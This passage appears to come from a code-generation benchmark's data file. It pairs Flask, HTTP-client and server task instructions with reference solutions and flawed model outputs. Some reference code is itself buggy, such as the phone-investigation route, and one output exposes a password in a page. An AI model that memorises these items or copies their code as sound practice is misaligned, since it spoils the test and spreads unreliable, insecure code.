== \"line\":\n            lineno = frame.f_lineno\n            queues[filename].append(lineno)\n            totals[filename][lineno] += 1\n            Source.lazycache(frame)\n\n    calling_frame.f_trace = trace_func\n    sys.settrace(trace_func)\n    \n    if browser and host_is_local:\n        with app.app_context():\n            url = url_for(\n                'file_view',\n                filename=calling_file,\n            )\n        webbrowser.open_new_tab(url)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, render_template, jsonify\nimport sys\nimport threading\nimport time\nimport os\nimport webbrowser\n\napp = Flask(__name__)\n\nclass TraceData:\n    def __init__(self):\n        self.calls = {}\n        self.file_calls = {}\n        self.line_calls = {}\n        self.stack_trace = []\n\n    def __call__(self, frame, event, arg):\n        if event == 'call':\n            self.stack_trace.append((frame.f_code.co_filename, frame.f_lineno))\n            self._record_call(frame)\n        elif event == 'return':\n            self._record_return(frame)\n        return self\n\n    def _record_call(self, frame):\n        filename = frame.f_code.co_filename\n        lineno = frame.f_lineno\n        if filename not in self.file_calls:\n            self.file_calls[filename] = {}\n        if lineno not in self.file_calls[filename]:\n            self.file_calls[filename][lineno] = 0\n        self.file_calls[filename][lineno] += 1\n        if filename not in self.calls:\n            self.calls[filename] = {}\n        if lineno not in self.calls[filename]:\n            self.calls[filename][lineno] = 0\n        self.calls[filename][lineno] += 1\n\n    def _record_return(self, frame):\n        pass\n\ndef trace(files=None, port=9999, host='127.0.0.1', browser=False, daemon=False):\n    trace_data = TraceData()\n    sys.settrace(trace_data)\n\n    @app.route('/')\n    def index():\n        return render_template('index.html', calls=trace_data.calls, file_calls=trace_data.file_calls, stack_trace=trace_data.stack_trace)\n\n    @app.route('/data')\n    def data():\n        return jsonify({\n            'calls': trace_data.calls,\n            'file_calls': trace_data.file_calls,\n            'stack_trace': trace_data.stack_trace\n        })\n\n    def run_server():\n        app.run(host=host, port=port, debug=False)\n\n    thread = threading.Thread(target=run_server)\n    if daemon:\n        thread.daemon = True\n    thread.start()\n\n    if browser:\n        webbrowser.open(f'http://{host}:{port}')\n\n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        sys.settrace(None)\n        thread.join()"
  },
  {
    "Task_id": 167,
    "Instruction": "The provided reference code is at the function level, specifically focusing on a Flask web application's route handling. Here's the structured instruction:\n\nTask Description: Create a Flask web application route handler that processes both GET and POST requests, implements various command-based functionalities, and returns appropriate HTML templates based on the input commands.\n\nFunction Description: The `index()` function serves as the main route handler for the root URL (\"/\"). It processes incoming HTTP requests, executes different actions based on the received commands (for POST requests), and returns corresponding HTML templates. The function handles feature activation, information display, and system operations through a command interface.\n\nInput:\n- HTTP request object (implicit through Flask)\n- For POST requests:\n  - Form data containing a command string (key: \"in\")\n- For GET requests:\n  - No explicit input parameters\n- Global variables (used in the function but not passed as parameters):\n  - redirectionMicrosoft (bool)\n  - redirectionMicrosoftFailed (bool)\n  - phone_number (str)\n  - email (str)\n  - password (str)\n  - Various feature flags (social_media, get_links, etc.)\n\nOutput:\n- HTTP responses containing:\n  - Rendered HTML templates (for successful operations)\n  - Redirects to other routes (for certain conditions)\n  - Error pages (for failed operations)\n\nThe function returns different responses based on:\n1. Request method (GET/POST)\n2. Specific command received (for POST requests)\n3. System state (global variables)\n4. Success/failure of operations",
    "Canonical_solution": "import os\nfrom flask import Flask, render_template, request, redirect, url_for\nimport threading\nimport subprocess\n\napp = Flask(__name__)\n\ndef run_flask_server():\n    app.run(str(subprocess.check_output(\"hostname -I | awk '{print $1}'\", shell=True).decode().strip()), 8080, debug=True)\n\n@app.route(\"/\", methods=[\"POST\", \"GET\"])\ndef index():\n    if request.method == \"GET\":\n        if redirectionMicrosoft == True:\n            return render_template(\"findOwnerSuccess.html\", phone_number=phone_number)\n        if redirectionMicrosoftFailed == True:\n            return render_template(\"failed.html\")\n        return render_template(\"index.html\")\n    if request.method == \"POST\":\n        command = request.form[\"in\"]\n        if command == \"help\":\n            return render_template(\"help.html\")\n        elif command[0:15] == \"add PhoneNumber\":\n            phone_number = str(\"+\" + re.search(\"\\d+\", command).group(0))\n            return render_template(\"phoneNumberSuccess.html\", phone_number=phone_number)\n        elif command[0:21] == \"add feature FindOwner\":\n            try:\n                if email != \"\" or password != \"\":\n                    find_owner = \"Added\"\n                    return render_template(\"findOwnerSuccess.html\", phone_number=phone_number)\n                else:\n                    return redirect(url_for(\"microsoftMail\"))\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:23] == \"add feature SocialMedia\":\n            social_media = \"Added\"\n            try:\n                return render_template(\"socialMediaSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:20] == \"add feature GetLinks\":\n            get_links = \"Added\"\n            try:\n                return render_template(\"GetLinksSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:20] == \"add feature SpamRisk\":\n            spam_risk = \"Added\"\n            try:\n                return render_template(\"SpamRiskSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:23] == \"add feature GetComments\":\n            get_comments = \"Added\"\n            try:\n                return render_template(\"GetCommentsSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:12] == \"show options\":\n            try:\n                return render_template(\"showoptions.html\", phone_number=phone_number, social_media=social_media, get_links=get_links, spam_risk=spam_risk, find_owner=find_owner, get_comments=get_comments)\n            except:\n                phone_number = \"Not Provided\"\n                return render_template(\"showoptions.html\", phone_number=phone_number, social_media=social_media, get_links=get_links, spam_risk=spam_risk, find_owner=find_owner, get_comments=get_comments)\n        elif command[0:20] == \"add feature *\":\n            runall = \"Added\"\n            social_media = \"Added\"\n            spam_risk = \"Added\"\n            get_comments = \"Added\"\n            get_links = \"Added\"\n            try:\n                if email != \"\" or password != \"\":\n                    find_owner = \"Added\"\n                    return render_template(\"featureAll.html\", phone_number=phone_number)\n                else:\n                    return redirect(url_for(\"microsoftMail\"))\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:3] == \"run\":\n            Investigation.general.location(phone_number)\n            country = Investigation.general.returnCountry()\n            operator = Investigation.general.returnOperator()\n            timeZone = Investigation.general.returnTimeZone()\n            errNumber = Investigation.general.return_errNumber_()\n            currentTime = Investigation.general.returnCurrentTime()\n            if errNumber != \"False\":\n                threading.Thread(target=runScripts).start()\n                time.sleep(2)\n                return redirect(url_for(\"investigation\"))\n            else:\n                return redirect(url_for(\"investigationErr\"))\n        else:\n            return render_template(\"unkownCommand.html\")\n\nif __name__ == \"__main__\":\n    run_flask_server()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "def index():\n    if request.method == 'GET':\n        return render_template('index.html')\n    else:\n        command = request.form['in']\n        if command == 'activate_feature':\n            if social_media and get_links and share_on_social:\n                return render_template('feature_activated.html')\n            else:\n                return render_template('feature_not_activated.html')\n        elif command == 'display_info':\n            return render_template('info_display.html', phone_number=phone_number, email=email, password=password)\n        elif command == 'system_shutdown':\n            return redirect(url_for('shutdown'))\n        elif command == 'redirect_microsoft':\n            if redirectionMicrosoft:\n                return redirect(url_for('microsoft_redirect'))\n            else:\n                return render_template('microsoft_error.html', redirectionMicrosoftFailed=redirectionMicrosoftFailed)\n        else:\n            return render_template('command_not_found.html', command=command)"
  },
  {
    "Task_id": 17,
    "Instruction": "Task Description: Create a custom HTTPConnection class that extends Python's http.client.HTTPConnection to provide enhanced functionality including proxy support, socket options, and improved error handling.\n\nClass Description: HTTPConnection is a subclass of http.client.HTTPConnection that adds additional features for making HTTP requests, including proxy support, configurable socket options, and better error handling. It maintains connection state and provides methods for making requests and processing responses.\n\nAttributes:\n- default_port: typing.ClassVar[int] - Default port for HTTP connections (80)\n- default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] - Default TCP socket options (TCP_NODELAY enabled)\n- socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] - Custom socket options for the connection\n- proxy: Optional[Url] - Proxy URL for the connection\n- proxy_config: Optional[ProxyConfig] - Configuration for proxy connections\n- _has_connected_to_proxy: bool - Flag indicating if connected to proxy\n- _response_options: Optional[_ResponseOptions] - Stores response processing options\n- _tunnel_host: Optional[str] - Host for tunnel connection\n- _tunnel_port: Optional[int] - Port for tunnel connection\n- _tunnel_scheme: Optional[str] - Scheme for tunnel connection\n\nMethods:\n- __init__(host: str, port: Optional[int] = None, *, timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT, source_address: Optional[tuple[str, int]] = None, blocksize: int = 16384, socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options, proxy: Optional[Url] = None, proxy_config: Optional[ProxyConfig] = None) -> None - Initializes the HTTP connection with specified parameters\n- _new_conn() -> socket.socket - Creates a new socket connection with error handling\n- connect() -> None - Establishes the connection to the server or proxy\n- request(method: str, url: str, body: Optional[_TYPE_BODY] = None, headers: Optional[Mapping[str, str]] = None, *, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None - Sends an HTTP request with the specified method, URL, body, and headers\n- getresponse() -> HTTPResponse - Gets the response from the server and returns an HTTPResponse object\n- close() -> None - Closes the connection and cleans up resources",
    "Canonical_solution": "import socket\nimport typing\nfrom http.client import HTTPConnection as _HTTPConnection\nfrom typing import Optional, Mapping, Union, Literal\nfrom .util.timeout import _TYPE_TIMEOUT, Timeout\nfrom ._base_connection import _TYPE_BODY\nfrom .util import connection\nfrom .util.url import Url\n\nclass HTTPConnection(_HTTPConnection):\n    default_port: typing.ClassVar[int] = port_by_scheme[\"http\"]\n    default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] = [\n        (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n    ]\n\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        *,\n        timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,\n        source_address: Optional[tuple[str, int]] = None,\n        blocksize: int = 16384,\n        socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options,\n        proxy: Optional[Url] = None,\n        proxy_config: Optional[ProxyConfig] = None,\n    ) -> None:\n        super().__init__(\n            host=host,\n            port=port,\n            timeout=Timeout.resolve_default_timeout(timeout),\n            source_address=source_address,\n            blocksize=blocksize,\n        )\n        self.socket_options = socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n        self._has_connected_to_proxy = False\n        self._response_options = None\n        self._tunnel_host: Optional[str] = None\n        self._tunnel_port: Optional[int] = None\n        self._tunnel_scheme: Optional[str] = None\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            sock = connection.create_connection(\n                (self._dns_host, self.port),\n                self.timeout,\n                source_address=self.source_address,\n                socket_options=self.socket_options,\n            )\n        except socket.gaierror as e:\n            raise NameResolutionError(self.host, self, e) from e\n        except SocketTimeout as e:\n            raise ConnectTimeoutError(\n                self,\n                f\"Connection to {self.host} timed out. (connect timeout={self.timeout})\",\n            ) from e\n        except OSError as e:\n            raise NewConnectionError(\n                self, f\"Failed to establish a new connection: {e}\"\n            ) from e\n        return sock\n\n    def connect(self) -> None:\n        self.sock = self._new_conn()\n        if self._tunnel_host:\n            self._has_connected_to_proxy = True\n            self._tunnel()\n        self._has_connected_to_proxy = bool(self.proxy)\n\n    def request(\n        self,\n        method: str,\n        url: str,\n        body: Optional[_TYPE_BODY] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        *,\n        chunked: bool = False,\n        preload_content: bool = True,\n        decode_content: bool = True,\n        enforce_content_length: bool = True,\n    ) -> None:\n        if self.sock is not None:\n            self.sock.settimeout(self.timeout)\n\n        self._response_options = _ResponseOptions(\n            request_method=method,\n            request_url=url,\n            preload_content=preload_content,\n            decode_content=decode_content,\n            enforce_content_length=enforce_content_length,\n        )\n\n        if headers is None:\n            headers = {}\n        header_keys = frozenset(to_str(k.lower()) for k in headers)\n        skip_accept_encoding = \"accept-encoding\" in header_keys\n        skip_host = \"host\" in header_keys\n        self.putrequest(\n            method, url, skip_accept_encoding=skip_accept_encoding, skip_host=skip_host\n        )\n\n        chunks_and_cl = body_to_chunks(body, method=method, blocksize=self.blocksize)\n        chunks = chunks_and_cl.chunks\n        content_length = chunks_and_cl.content_length\n\n        if chunked:\n            if \"transfer-encoding\" not in header_keys:\n                self.putheader(\"Transfer-Encoding\", \"chunked\")\n        else:\n            if \"content-length\" in header_keys:\n                chunked = False\n            elif \"transfer-encoding\" in header_keys:\n                chunked = True\n            else:\n                chunked = False\n                if content_length is None:\n                    if chunks is not None:\n                        chunked = True\n                        self.putheader(\"Transfer-Encoding\", \"chunked\")\n                else:\n                    self.putheader(\"Content-Length\", str(content_length))\n\n        if \"user-agent\" not in header_keys:\n            self.putheader(\"User-Agent\", _get_default_user_agent())\n        for header, value in headers.items():\n            self.putheader(header, value)\n        self.endheaders()\n\n        if chunks is not None:\n            for chunk in chunks:\n                if not chunk:\n                    continue\n                if isinstance(chunk, str):\n                    chunk = chunk.encode(\"utf-8\")\n                if chunked:\n                    self.send(b\"%x\\r\\n%b\\r\\n\" % (len(chunk), chunk))\n                else:\n                    self.send(chunk)\n\n        if chunked:\n            self.send(b\"0\\r\\n\\r\\n\")\n\n    def getresponse(self) -> HTTPResponse:\n        if self._response_options is None:\n            raise ResponseNotReady()\n\n        resp_options = self._response_options\n        self._response_options = None\n        self.sock.settimeout(self.timeout)\n\n        httplib_response = super().getresponse()\n        headers = HTTPHeaderDict(httplib_response.msg.items())\n\n        response = HTTPResponse(\n            body=httplib_response,\n            headers=headers,\n            status=httplib_response.status,\n            version=httplib_response.version,\n            version_string=getattr(self, \"_http_vsn_str\", \"HTTP/?\"),\n            reason=httplib_response.reason,\n            preload_content=resp_options.preload_content,\n            decode_content=resp_options.decode_content,\n            original_response=httplib_response,\n            enforce_content_length=resp_options.enforce_content_length,\n            request_method=resp_options.request_method,\n            request_url=resp_options.request_url,\n        )\n        return response\n\n    def close(self) -> None:\n        try:\n            super().close()\n        finally:\n            self.sock = None\n            self.is_verified = False\n            self.proxy_is_verified = None\n            self._has_connected_to_proxy = False\n            self._response_options = None\n            self._tunnel_host = None\n            self._tunnel_port = None\n            self._tunnel_scheme = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import http.client\nfrom typing import Optional, Mapping, Tuple, TypeVar, ClassVar, Any\nimport socket\nfrom urllib.parse import urlparse\nfrom dataclasses import dataclass\nfrom typing import List, Dict, Union\nimport ssl\n\n_T = TypeVar('_T')\n\n@dataclass\nclass ProxyConfig:\n    username: str\n    password: str\n    scheme: str\n    host: str\n    port: int\n    tunnel_host: Optional[str] = None\n    tunnel_port: Optional[int] = None\n    tunnel_scheme: Optional[str] = None\n\n@dataclass\nclass _ResponseOptions:\n    pass\n\nclass HTTPConnection(http.client.HTTPConnection):\n    default_port: ClassVar[int] = 80\n    default_socket_options: ClassVar[List[Tuple[int, int]]] = [(socket.TCP_NODELAY, 1)]\n    socket_options: Optional[List[Tuple[int, int]]] = None\n    proxy: Optional[str] = None\n    proxy_config: Optional[ProxyConfig] = None\n    _has_connected_to_proxy: bool = False\n    _response_options: Optional[_ResponseOptions] = None\n    _tunnel_host: Optional[str] = None\n    _tunnel_port: Optional[int] = None\n    _tunnel_scheme: Optional[str] = None\n\n    def __init__(self, host: str, port: Optional[int] = None, *, timeout: float = 10.0, source_address: Optional[Tuple[str, int]] = None, blocksize: int = 16384, socket_options: Optional[List[Tuple[int, int]]] = None, proxy: Optional[str] = None, proxy_config: Optional[ProxyConfig] = None) -> None:\n        super().__init__(host, port, timeout=timeout, source_address=source_address)\n        self.socket_options = socket_options or self.default_socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            for option, value in self.socket_options:\n                sock.setsockopt(socket.SOL_TCP, option, value)\n            return sock\n        except Exception as e:\n            raise ConnectionError(f\"Failed to create socket: {e}\")\n\n    def connect(self) -> None:\n        if self.proxy:\n            self._connect_to_proxy()\n        else:\n            super().connect()\n\n    def _connect_to_proxy(self) -> None:\n        if not self.proxy_config:\n            raise ValueError(\"Proxy configuration is required\")\n        proxy_url = urlparse(self.proxy)\n        proxy_scheme = proxy_url.scheme\n        proxy_host = proxy_url.hostname\n        proxy_port = proxy_url.port or self.default_port\n        self._tunnel_scheme = proxy_scheme\n        self._tunnel_host = proxy_host\n        self._tunnel_port = proxy_port\n        self._has_connected_to_proxy = True\n        if self.proxy_config.username or self.proxy_config.password:\n            self._auth_to_proxy()\n        self._connect_to_tunnel()\n\n    def _auth_to_proxy(self) -> None:\n        if self.proxy_config.username or self.proxy_config.password:\n            auth = f\"{self.proxy_config.username}:{self.proxy_config.password}\"\n            auth_header = f\"Proxy-Authorization: Basic {auth.encode('base64').decode('ascii')}\"\n            self._putheaders = [auth_header]\n\n    def _connect_to_tunnel(self) -> None:\n        if self._tunnel_host and self._tunnel_port:\n            self._tunnel_host = self._tunnel_host\n            self._tunnel_port = self._tunnel_port\n            self._tunnel_scheme = self._tunnel_scheme\n            self._connect()\n\n    def request(self, method: str, url: str, body: Optional[bytes] = None, headers: Optional[Mapping[str, str]] = None, *, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None:\n        if self.proxy:\n            self._request_via_proxy(method, url, body, headers, chunked, preload_content, decode_content, enforce_content_length)\n        else:\n            super().request(method, url, body, headers, chunked=chunked, preload_content=preload_content, decode_content=decode_content, enforce_content_length=enforce_content_length)\n\n    def _request_via_proxy(self, method: str, url: str, body: Optional[bytes] = None, headers: Optional[Mapping[str, str]] = None, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None:\n        if not self.proxy_config:\n            raise ValueError(\"Proxy configuration is required\")\n        proxy_url = urlparse(self.proxy)\n        proxy_scheme = proxy_url.scheme\n        proxy_host = proxy_url.hostname\n        proxy_port = proxy_url.port or self.default_port\n        self._tunnel_scheme = proxy_scheme\n        self._tunnel_host = proxy_host\n        self._tunnel_port = proxy_port\n        self._has_connected_to_proxy = True\n        if self.proxy_config.username or self.proxy_config.password:\n            self._auth_to_proxy()\n        self._connect_to_tunnel()\n        super().request(method, url, body, headers, chunked=chunked, preload_content=preload_content, decode_content=decode_content, enforce_content_length=enforce_content_length)\n\n    def getresponse(self) -> http.client.HTTPResponse:\n        if self.proxy:\n            self._getresponse_via_proxy()\n        else:\n            return super().getresponse()\n\n    def _getresponse_via_proxy(self) -> http.client.HTTPResponse:\n        if not self.proxy_config:\n            raise ValueError(\"Proxy configuration is required\")\n        proxy_url = urlparse(self.proxy)\n        proxy_scheme = proxy_url.scheme\n        proxy_host = proxy_url.hostname\n        proxy_port = proxy_url.port or self.default_port\n        self._tunnel_scheme = proxy_scheme\n        self._tunnel_host = proxy_host\n        self._tunnel_port = proxy_port\n        self._has_connected_to_proxy = True\n        if self.proxy_config.username or self.proxy_config.password:\n            self._auth_to_proxy()\n        self._connect_to_tunnel()\n        return super().getresponse()\n\n    def close(self) -> None:\n        if self.proxy:\n            self._close_via_proxy()\n        else:\n            super().close()\n\n    def _close_via_proxy(self) -> None:\n        if not self.proxy_config:\n            raise ValueError(\"Proxy configuration is required\")\n        proxy_url = urlparse(self.proxy)\n        proxy_scheme = proxy_url.scheme\n        proxy_host = proxy_url.hostname\n        proxy_port = proxy_url.port or self.default_port\n        self._tunnel_scheme = proxy_scheme\n        self._tunnel_host = proxy_host\n        self._tunnel_port = proxy_port\n        self._has_connected_to_proxy = True\n        if self.proxy_config.username or self.proxy_config.password:\n            self._auth_to_proxy()\n        self._close()"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a simple web application using Flask that interacts with Redis to track and display the number of times the homepage has been accessed.\n\nFunction Description: The function `hello()` is a Flask route handler for the root URL ('/'). It increments a counter in Redis each time the route is accessed and returns a greeting message along with the current count of visits.\n\nInput: \n- None (The function handles HTTP GET requests to the root URL without requiring explicit input parameters)\n\nOutput: \n- A string response containing \"Hello World!\" followed by the current visit count in the format: \"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\" where {count} is the number of times the page has been accessed.",
    "Canonical_solution": "from flask import Flask\nfrom redis import Redis\n\napp = Flask(__name__)\nredis = Redis(host='redis', port=6379)\n\n@app.route('/')\ndef hello():\n    count = redis.incr('hits')\n    return 'Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {} \u6b21\u3002\\n'.format(count)\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask\nimport redis\n\napp = Flask(__name__)\nredis_client = redis.Redis(host='localhost', port=6379, db=0)\n\n@app.route('/')\ndef hello():\n    count = redis_client.incr('visit_count')\n    return f\"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\"\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Create a Python class that implements an API server using Flask and gevent WSGI server, capable of serving web UI and handling REST API requests with proper error handling.\n\nClass Description: APIServer is a class that encapsulates a Flask web server with gevent WSGI capabilities. It handles server lifecycle management, web UI serving, and error handling for REST API endpoints.\n\nAttributes:\n- stop_event: [Event] - A gevent event used to signal server shutdown\n- config: [RestApiConfig] - Configuration object containing server settings (host, port, etc.)\n- rest_api: [RestAPI] - Reference to the main REST API implementation\n- wsgiserver: [Optional[WSGIServer]] - The gevent WSGI server instance\n- flask_app: [Flask] - The Flask application instance\n\nMethods:\n- __init__(rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None) -> None - Initializes the API server with configuration and dependencies\n- _serve_webui(file_name: str = \"index.html\") -> Response - Serves web UI files from configured directory (handles fallback to index.html)\n- _run() -> None - Internal method to run the WSGI server indefinitely\n- start() -> None - Starts the API server and initializes the WSGI server\n- stop() -> None - Stops the API server gracefully\n- unhandled_exception(exception: Exception) -> Response - Global exception handler that returns error responses and logs critical errors",
    "Canonical_solution": "import errno\nimport logging\nimport socket\nfrom typing import Optional\n\nimport gevent\nimport gevent.pool\nfrom flask import Flask\nfrom gevent.event import Event\nfrom gevent.pywsgi import WSGIServer\nfrom werkzeug.exceptions import NotFound\n\nclass APIServer:\n    def __init__(\n        self,\n        rest_api: \"RestAPI\",\n        config: RestApiConfig,\n        eth_rpc_endpoint: str = None,\n    ) -> None:\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver: Optional[WSGIServer] = None\n\n        flask_app = Flask(__name__)\n        self.flask_app = flask_app\n\n        self.flask_app.register_error_handler(HTTPStatus.NOT_FOUND, endpoint_not_found)\n        self.flask_app.register_error_handler(Exception, self.unhandled_exception)\n\n        if config.web_ui_enabled:\n            for route in (\"/ui/<path:file_name>\", \"/ui\", \"/ui/\", \"/index.html\", \"/\"):\n                self.flask_app.add_url_rule(\n                    route, route, view_func=self._serve_webui, methods=(\"GET\",)\n                )\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        try:\n            if not file_name:\n                raise NotFound\n\n            response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], file_name)\n        except (NotFound, AssertionError):\n            if file_name.endswith(\".json\"):\n                response = api_error(\n                    \"Service unavailable, try again later\", HTTPStatus.SERVICE_UNAVAILABLE\n                )\n            else:\n                response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], \"index.html\")\n        return response\n\n    def _run(self) -> None:\n        try:\n            if self.wsgiserver is not None:\n                self.wsgiserver.serve_forever()\n        except gevent.GreenletExit:\n            raise\n        except Exception:\n            self.stop()\n            raise\n\n    def start(self) -> None:\n        self.stop_event.clear()\n\n        wsgi_log = logging.getLogger(__name__ + \".pywsgi\")\n        pool = gevent.pool.Pool()\n        wsgiserver = WSGIServer(\n            (self.config.host, self.config.port),\n            self.flask_app,\n            log=wsgi_log,\n            error_log=wsgi_log,\n            spawn=pool,\n        )\n\n        try:\n            wsgiserver.init_socket()\n        except socket.error as e:\n            if e.errno == errno.EADDRINUSE:\n                raise APIServerPortInUseError(f\"{self.config.host}:{self.config.port}\")\n            raise\n\n        self.wsgiserver = wsgiserver\n        super().start()\n\n    def stop(self) -> None:\n        self.stop_event.set()\n\n        if self.wsgiserver is not None:\n            self.wsgiserver.stop(timeout=5)\n            self.wsgiserver = None\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        log.critical(\n            \"Unhandled exception when processing endpoint request\",\n            exc_info=True,\n            node=self.rest_api.checksum_address,\n        )\n        self.greenlet.kill(exception)\n        return api_error([str(exception)], HTTPStatus.INTERNAL_SERVER_ERROR)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, Response, send_from_directory\nimport gevent.wsgi\nfrom gevent.event import Event\nfrom rest_api_config import RestApiConfig\nfrom rest_api import RestAPI\nimport os\nimport logging\n\nclass APIServer:\n    def __init__(self, rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None) -> None:\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver = None\n        self.flask_app = Flask(__name__)\n        self._setup_routes()\n        self._setup_error_handlers()\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        webui_dir = self.config.webui_directory\n        if os.path.exists(os.path.join(webui_dir, file_name)):\n            return send_from_directory(webui_dir, file_name)\n        else:\n            return send_from_directory(webui_dir, \"index.html\")\n\n    def _run(self) -> None:\n        self.wsgiserver = gevent.wsgi.WSGIServer(\n            (self.config.host, self.config.port),\n            self.flask_app,\n            spawn=not self.config.debug_mode\n        )\n        try:\n            self.wsgiserver.serve_forever()\n        except KeyboardInterrupt:\n            self.stop()\n\n    def start(self) -> None:\n        self.wsgiserver = gevent.wsgi.WSGIServer(\n            (self.config.host, self.config.port),\n            self.flask_app,\n            spawn=not self.config.debug_mode\n        )\n        self.wsgiserver.start()\n        gevent.spawn(self._run)\n\n    def stop(self) -> None:\n        if self.wsgiserver:\n            self.wsgiserver.stop()\n            self.stop_event.set()\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        logging.error(\"Uncaught exception: %s\", exception, exc_info=True)\n        return Response(\"An unexpected error occurred.\", status=500)\n\n    def _setup_routes(self):\n        self.flask_app.add_url_rule('/', 'webui', self._serve_webui)\n        self.flask_app.add_url_rule('/api/<path:resource>', 'api', self.rest_api.route)\n\n    def _setup_error_handlers(self):\n        self.flask_app.register_error_handler(Exception, self.unhandled_exception)"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a RESTful API for a Todo application using Flask and Flask-RESTx that supports CRUD operations (Create, Read, Update, Delete) for todo items.\n\nClass Description: TodoAPI is a class that encapsulates the functionality of a Todo REST API. It initializes a Flask application, sets up API routes, defines data models, and manages todo items through a data access object (DAO).\n\nAttributes:\n- app: Flask - The Flask application instance\n- api: Api - The Flask-RESTx API instance for route registration\n- ns: Namespace - The namespace for organizing todo-related routes\n- todo: Model - The data model for todo items\n- todo_dao: TodoDAO - The data access object for managing todo items\n\nMethods:\n- __init__() -> None - Initializes the Flask app, API, namespace, data model, and sample data\n- _setup_routes() -> None - Defines all API routes and their handlers\n- run() -> None - Starts the Flask development server\n\nClass Description: TodoDAO is a helper class that manages the storage and retrieval of todo items in memory.\n\nAttributes:\n- counter: int - Auto-incrementing counter for todo IDs\n- todos: list - List storing all todo items\n\nMethods:\n- get(id: int) -> dict - Retrieves a todo item by ID or aborts with 404 if not found\n- create(data: dict) -> dict - Creates a new todo item with an auto-generated ID\n- update(id: int, data: dict) -> dict - Updates an existing todo item\n- delete(id: int) -> None - Deletes a todo item by ID",
    "Canonical_solution": "from flask import Flask\nfrom flask_restx import Api, Resource, fields\nfrom werkzeug.middleware.proxy_fix import ProxyFix\n\nclass TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.app.wsgi_app = ProxyFix(self.app.wsgi_app)\n        self.api = Api(\n            self.app,\n            version=\"1.0\",\n            title=\"TodoMVC API\",\n            description=\"A simple TodoMVC API\",\n        )\n        self.ns = self.api.namespace(\"todos\", description=\"TODO operations\")\n        \n        self.todo = self.api.model(\n            \"Todo\",\n            {\n                \"id\": fields.Integer(readonly=True, description=\"The task unique identifier\"),\n                \"task\": fields.String(required=True, description=\"The task details\"),\n            },\n        )\n        \n        self.todo_dao = TodoDAO()\n        self.todo_dao.create({\"task\": \"Build an API\"})\n        self.todo_dao.create({\"task\": \"?????\"})\n        self.todo_dao.create({\"task\": \"profit!\"})\n        \n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.ns.route(\"/\")\n        class TodoList(Resource):\n            @self.ns.doc(\"list_todos\")\n            @self.ns.marshal_list_with(self.todo)\n            def get(self):\n                return self.todo_dao.todos\n\n            @self.ns.doc(\"create_todo\")\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo, code=201)\n            def post(self):\n                return self.todo_dao.create(self.api.payload), 201\n\n        @self.ns.route(\"/<int:id>\")\n        @self.ns.response(404, \"Todo not found\")\n        @self.ns.param(\"id\", \"The task identifier\")\n        class Todo(Resource):\n            @self.ns.doc(\"get_todo\")\n            @self.ns.marshal_with(self.todo)\n            def get(self, id):\n                return self.todo_dao.get(id)\n\n            @self.ns.doc(\"delete_todo\")\n            @self.ns.response(204, \"Todo deleted\")\n            def delete(self, id):\n                self.todo_dao.delete(id)\n                return \"\", 204\n\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo)\n            def put(self, id):\n                return self.todo_dao.update(id, 